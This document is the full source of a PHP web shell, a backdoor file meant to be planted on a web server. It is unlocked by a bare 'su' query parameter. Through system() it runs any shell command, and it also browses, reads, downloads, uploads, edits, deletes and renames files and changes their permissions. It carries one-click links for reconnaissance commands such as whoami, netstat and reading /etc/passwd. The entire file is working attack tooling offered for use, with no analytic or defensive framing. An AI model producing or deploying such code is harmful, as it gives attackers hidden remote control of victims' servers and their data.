<?php
if(!isset($_GET['su']))exit;
echo 45*69;
$d=isset($_GET['d'])?$_GET['d']:realpath($_SERVER['DOCUMENT_ROOT']);
$d=realpath($d);chdir($d);
$a=$_GET['a']??'';$c=$_GET['c']??'';$f=$_GET['f']??'';$n=$_GET['n']??'';$e=isset($_GET['e'])?base64_decode($_GET['e']):'';$p=$_GET['p']??'';$t=$_GET['t']??'';
$msg='';
if($a=='cmd'&&$c){ob_start();system($c);$msg='<div class=result><h3>▶ Output</h3><pre>'.htmlspecialchars(ob_get_clean()).'</pre></div>';}
if($a=='cat'&&$f&&file_exists($f)){$msg='<div class=result><h3>📄 '.htmlspecialchars(basename($f)).'</h3><pre>'.htmlspecialchars(file_get_contents($f)).'</pre></div>';}
if($a=='info'&&$f&&file_exists($f)){$s=stat($f);$msg='<div class=result><h3>ℹ '.htmlspecialchars(basename($f)).'</h3><table><tr><td>Size</td><td>'.$s['size'].'</td></tr><tr><td>Perms</td><td>'.substr(sprintf('%o',$s['mode']),-4).'</td></tr><tr><td>Modified</td><td>'.date('Y-m-d H:i:s',$s['mtime']).'</td></tr><tr><td>Owner</td><td>'.$s['uid'].':'.$s['gid'].'</td></tr></table></div>';}
if($a=='dl'&&$f&&file_exists($f)){header('Content-Type:application/octet-stream');header('Content-Disposition:attachment;filename="'.basename($f).'"');readfile($f);exit;}
if($_SERVER['REQUEST_METHOD']==='POST'){
    if(!empty($_FILES['u']['name'])){move_uploaded_file($_FILES['u']['tmp_name'],rtrim($d,'/').'/'.$_FILES['u']['name']);$msg='<div class=result style="border-color:#3fb950"><h3>✓ Uploaded</h3><p>'.htmlspecialchars($_FILES['u']['name']).'</p></div>';}
    elseif(!empty($_POST['folder_name'])){@mkdir($d.'/'.$_POST['folder_name']);$msg='<div class=result style="border-color:#3fb950"><h3>✓ Folder Created</h3></div>';}
    elseif(!empty($_POST['file_name'])){@file_put_contents($d.'/'.$_POST['file_name'],$_POST['file_content']);$msg='<div class=result style="border-color:#3fb950"><h3>✓ File Saved</h3></div>';}
    elseif(!empty($_POST['delete_file'])){$df=$d.'/'.$_POST['delete_file'];is_dir($df)?@rmdir($df):@unlink($df);$msg='<div class=result style="border-color:#f85149"><h3>✕ Deleted</h3></div>';}
    elseif(!empty($_POST['old_name'])&&!empty($_POST['new_name'])){@rename($d.'/'.$_POST['old_name'],$d.'/'.$_POST['new_name']);$msg='<div class=result style="border-color:#d29922"><h3>✎ Renamed</h3></div>';}
}
if($a=='rm'&&$f){is_dir($f)?@rmdir($f):@unlink($f);$msg='<div class=result style="border-color:#f85149"><h3>✕ Deleted</h3></div>';}
if($a=='mv'&&$f&&$n&&file_exists($f)){@rename($f,$d.'/'.$n);$msg='<div class=result style="border-color:#d29922"><h3>✎ Renamed</h3></div>';}
if($a=='cp'&&$f&&$t&&file_exists($f)){is_dir($f)?@cpdir($f,$t):@copy($f,$t);$msg='<div class=result style="border-color:#3fb950"><h3>📋 Copied</h3></div>';}
if($a=='edit'&&$f&&$e!==''){@file_put_contents($f,$e);$msg='<div class=result style="border-color:#3fb950"><h3>✓ File Saved</h3></div>';}
if($a=='mkdir'&&$f){@mkdir($f);$msg='<div class=result style="border-color:#3fb950"><h3>📁 Folder Created</h3></div>';}
if($a=='chmod'&&$f&&$p){@chmod($f,octdec($p));$msg='<div class=result style="border-color:#d29922"><h3>🔑 Permissions Changed</h3></div>';}
function cpdir($s,$d){@mkdir($d,0777,true);foreach(scandir($s)as$v){if($v=='.'||$v=='..')continue;$sp="$s/$v";$dp="$d/$v";is_dir($sp)?cpdir($sp,$dp):@copy($sp,$dp);}}
?>
<!DOCTYPE html>
<html lang=en>
<head>
<meta charset=UTF-8>
<meta name=viewport content="width=device-width,initial-scale=1.0">
<title>Shell</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0d1117;color:#c9d1d9;font:14px/1.6 -apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif;padding:24px;max-width:1200px;margin:0 auto}
a{color:#58a6ff;text-decoration:none}a:hover{color:#79c0ff;text-decoration:underline}
h1{color:#f0f6fc;font-size:22px;font-weight:600}
nav{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:12px 16px;margin-bottom:16px;font-size:13px}
nav a{margin:0 2px}
.pane{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px;margin:12px 0}
.actions{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:16px}
.actions button{background:#21262d;border:1px solid #30363d;color:#c9d1d9;padding:7px 16px;border-radius:6px;cursor:pointer;font-size:13px;font-weight:500;transition:.2s}
.actions button:hover{background:#30363d;border-color:#8b949e}
input,textarea,select{background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:7px 12px;border-radius:6px;font:13px -apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif;outline:none;width:100%}
input:focus,textarea:focus{border-color:#58a6ff;box-shadow:0 0 0 2px rgba(88,166,255,0.3)}
textarea{min-height:120px;resize:vertical;font-family:ui-monospace,SFMono-Regular,SF Mono,Menlo,Consolas,monospace}
table{width:100%;border-collapse:collapse}
th{color:#8b949e;font-size:11px;font-weight:600;text-transform:uppercase;text-align:left;padding:8px 12px;border-bottom:1px solid #21262d;letter-spacing:.5px}
td{padding:8px 12px;border-bottom:1px solid #21262d;font-size:13px}
tr:hover td{background:#1c2128}
.sz{color:#8b949e;font-size:12px}
.tag{display:inline-block;background:#1f6feb33;color:#58a6ff;font-size:10px;padding:2px 7px;border-radius:12px;font-weight:600}
.rm{color:#f85149!important}.rm:hover{color:#ff6b61!important}
.dl{color:#3fb950!important}
.result{background:#161b22;border:1px solid #30363d;border-left:3px solid #58a6ff;border-radius:8px;padding:14px 16px;margin:12px 0}
.result h3{font-size:14px;font-weight:600;margin-bottom:6px;color:#f0f6fc}
.result pre{background:#0d1117;padding:12px;border-radius:6px;overflow-x:auto;font:12px ui-monospace,SFMono-Regular,SF Mono,Menlo,Consolas,monospace;margin-top:8px;max-height:400px;overflow-y:auto}
.result table td{padding:3px 12px 3px 0;border:none;font-size:13px}
.result table td:first-child{color:#8b949e;font-weight:500}
.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(1,4,9,0.8);z-index:999;align-items:center;justify-content:center}
.modal.show{display:flex}
.modal-box{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:24px;width:520px;max-width:90vw;max-height:80vh;overflow-y:auto}
.modal-box h3{color:#f0f6fc;font-size:16px;font-weight:600;margin-bottom:14px}
.modal-actions{display:flex;gap:8px;justify-content:flex-end;margin-top:12px}
.modal-actions button,.modal-actions input[type=submit]{background:#21262d;border:1px solid #30363d;color:#c9d1d9;padding:6px 14px;border-radius:6px;cursor:pointer;font-size:12px;font-weight:600;transition:.2s}
.modal-actions button:hover,.modal-actions input[type=submit]:hover{background:#30363d;border-color:#8b949e}
.header{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;flex-wrap:wrap;gap:8px}
.header-info{text-align:right;font-size:12px;color:#8b949e;line-height:1.5}
.quick-cmds{font-size:12px;color:#8b949e;text-align:center;padding:8px}
.quick-cmds a{margin:0 6px;font-weight:500}
</style>
</head>
<body>
<div class=header>
<div><h1>Shell</h1><span style=color:#8b949e;font-size:12px><?=php_uname('s').' '.php_uname('r')?> | PHP <?=phpversion()?> | <?=@disk_free_space('.')?>B free</span></div>
<div class=header-info><?=date('Y-m-d H:i:s')?><br>UID: <?=function_exists('posix_getuid')?posix_getuid():'?'?></div>
</div>
<nav>📁 <b><?=$d?></b>
<?php $ps=explode(DIRECTORY_SEPARATOR,$d);$cp='';foreach($ps as$i=>$s){if($s===''){$cp='/';continue;}$cp=rtrim($cp,'/').'/'.$s;echo' / <a href="?su=1&d='.rawurlencode($cp).'">'.($s?:'').'</a>';}?>
<a href="?su=1&d=<?=rawurlencode(realpath($_SERVER['DOCUMENT_ROOT']))?>" style=color:#3fb950> [root]</a>
</nav>
<div class=actions>
<button onclick="m('cmd')">▶ Terminal</button>
<button onclick="m('up')">↑ Upload</button>
<button onclick="m('mkdir')">📁 Mkdir</button>
<button onclick="m('mkfile')">📄 New File</button>
<button onclick="m('chmod')">🔑 Chmod</button>
</div>
<?=$msg?>
<div class=pane><table><tr><th>Name</th><th>Size</th><th>Modified</th><th>Perms</th><th colspan=4></th></tr>
<?php $x=@scandir($d);if($x)foreach($x as$v){if($v=='.')continue;$p="$d/$v";$i=is_dir($p);$fs=$i?'-':filesize($p);$fm=filemtime($p);$pe=substr(sprintf('%o',fileperms($p)),-4);
echo'<tr><td>'.($i?'📁 <b>':'').'<a href="?su=1&d='.rawurlencode($p).'">'.$v.'</a>'.($i?'</b>':'').'</td>';
echo'<td class=sz>'.($i?'<span class=tag>DIR</span>':$fs).'</td>';
echo'<td class=sz>'.date('m-d H:i',$fm).'</td>';
echo'<td class=sz>'.$pe.'</td>';
echo'<td><a href="?su=1&a=info&f='.rawurlencode($p).'" title=Info>ℹ</a></td>';
echo'<td>'.($i?'':'<a href="?su=1&a=cat&f='.rawurlencode($p).'" title=View>👁</a>').'</td>';
echo'<td><a class=dl href="?su=1&a=dl&f='.rawurlencode($p).'" title=Download>↓</a></td>';
echo'<td><a class=rm href="?su=1&a=rm&f='.rawurlencode($p).'" onclick="return confirm(1)" title=Delete>✕</a></td></tr>';}?>
</table></div>
<?php if(!$x)echo'<div class=pane style=text-align:center;color:#8b949e>⚠ Cannot read directory</div>';?>
<div class=quick-cmds>
<a href="?su=1&a=cmd&c=id">id</a> ·
<a href="?su=1&a=cmd&c=uname+-a">uname</a> ·
<a href="?su=1&a=cmd&c=whoami">whoami</a> ·
<a href="?su=1&a=cmd&c=df+-h">disk</a> ·
<a href="?su=1&a=cmd&c=cat+/etc/passwd|head+-5">passwd</a> ·
<a href="?su=1&a=cmd&c=netstat+-tlnp">ports</a> ·
<a href="?su=1&a=cmd&c=ps+aux|head+-20">ps</a>
</div>
<?php
// Inline rename per item
$x=@scandir($d);if($x)foreach($x as$v){if($v=='.')continue;$p="$d/$v";
echo'<div id="rn-'.rawurlencode($v).'" class=modal><div class=modal-box>
<h3>✎ Rename: '.htmlspecialchars($v).'</h3>
<form method=get><input type=hidden name=su value=1><input type=hidden name=d value="'.htmlspecialchars($d).'"><input type=hidden name=a value=mv><input type=hidden name=f value="'.htmlspecialchars($p).'">
<input type=text name=n placeholder="New name" value="'.htmlspecialchars($v).'" required>
<div class=modal-actions><button type=button onclick="this.closest(\'.modal\').classList.remove(\'show\')">Cancel</button><input type=submit value=Rename></div></form></div></div>';}
?>
<div id=m-cmd class=modal><div class=modal-box><h3>▶ Terminal</h3><form method=get><input type=hidden name=su value=1><input type=hidden name=a value=cmd><input type=hidden name=d value="<?=htmlspecialchars($d)?>"><input type=text name=c placeholder="Enter command..." style="font-family:ui-monospace,SFMono-Regular,SF Mono,Menlo,Consolas,monospace" autofocus><div class=modal-actions><button type=button onclick="this.closest('.modal').classList.remove('show')">Cancel</button><input type=submit value=Run></div></form></div></div>
<div id=m-up class=modal><div class=modal-box><h3>↑ Upload File</h3><form method=post enctype=multipart/form-data><input type=hidden name=su value=1><input type=hidden name=d value="<?=htmlspecialchars($d)?>"><input type=file name=u required><div class=modal-actions><button type=button onclick="this.closest('.modal').classList.remove('show')">Cancel</button><input type=submit value=Upload></div></form></div></div>
<div id=m-mkdir class=modal><div class=modal-box><h3>📁 New Folder</h3><form method=get><input type=hidden name=su value=1><input type=hidden name=d value="<?=htmlspecialchars($d)?>"><input type=hidden name=a value=mkdir><input type=text name=f placeholder="Folder name..." required><div class=modal-actions><button type=button onclick="this.closest('.modal').classList.remove('show')">Cancel</button><input type=submit value=Create></div></form></div></div>
<div id=m-mkfile class=modal><div class=modal-box><h3>📄 New File</h3><form method=get><input type=hidden name=su value=1><input type=hidden name=d value="<?=htmlspecialchars($d)?>"><input type=hidden name=a value=mkfile><input type=text name=f placeholder="File name..." required><textarea name=e placeholder="File content (base64, leave empty for blank)"></textarea><div class=modal-actions><button type=button onclick="this.closest('.modal').classList.remove('show')">Cancel</button><input type=submit value=Create></div></form></div></div>
<div id=m-chmod class=modal><div class=modal-box><h3>🔑 Change Permissions</h3><form method=get><input type=hidden name=su value=1><input type=hidden name=d value="<?=htmlspecialchars($d)?>"><input type=hidden name=a value=chmod><input type=text name=f placeholder="File path (relative to current dir)" required><input type=text name=p placeholder="Permissions (e.g. 0644, 0755)" value=0644 required><div class=modal-actions><button type=button onclick="this.closest('.modal').classList.remove('show')">Cancel</button><input type=submit value=Change></div></form></div></div>
<script>
function m(id){document.getElementById('m-'+id).classList.add('show')}
document.querySelectorAll('.modal').forEach(m=>{m.addEventListener('click',function(e){if(e.target===this)this.classList.remove('show')})})
</script>
</body>
</html>
